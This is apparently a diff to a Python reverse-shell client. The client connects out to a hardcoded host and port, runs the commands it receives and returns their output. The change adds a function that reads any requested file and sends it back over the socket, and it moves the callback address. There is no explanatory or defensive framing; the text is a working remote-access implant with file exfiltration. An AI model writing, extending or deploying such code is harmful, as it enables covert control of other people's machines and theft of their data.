@@ -25,10 +25,20 @@ def download_file(command):
     file = open(file_name,"wb")
     file.write(file_bytes)
     file.close()
+
+def upload_file(file_name):
+
+    with open(file_name,"rb") as file:
+        data = file.read()
+    
+    sock.send(data)
+    sock.send(b"<END>")
+
+    file.close()
     
 if __name__ == '__main__':
-    HOST = "192.168.1.102"
-    PORT = 5555
+    HOST = "192.168.1.104"
+    PORT = 5549
 
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     sock.connect((HOST,PORT))
@@ -40,6 +50,10 @@ if __name__ == '__main__':
         if command[:6] == "upload":
 
             download_file(command)
+
+        if command[:8] == "download":
+
+            upload_file(command[9:])
 
         elif command[:2] == "cd":
             try:
@@ -56,3 +70,10 @@ if __name__ == '__main__':
                 sock.sendall(result.stdout.read())
             except:
                 pass
+       
+ 
+
+     
+
+
+
